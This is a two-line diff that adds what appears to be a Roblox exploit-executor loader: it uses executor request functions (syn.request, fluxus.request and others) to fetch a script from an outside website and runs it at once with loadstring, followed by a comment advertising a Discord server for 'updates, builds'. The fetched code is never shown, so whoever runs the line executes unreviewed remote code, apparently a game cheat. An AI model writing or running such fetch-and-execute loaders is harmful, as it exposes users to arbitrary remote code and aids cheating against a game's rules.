@@ -1,0 +1,2 @@
+loadstring(((syn and syn.request) or (fluxus and fluxus.request) or request or http_request)({Url = "https://www.stenutilities.com/babft"})["Body"])()
+-- https://discord.gg/FnwBJz9nwg JOIN STENS DISCORD FOR MORE UPDATES, BUILDS, IMAGES, ETC
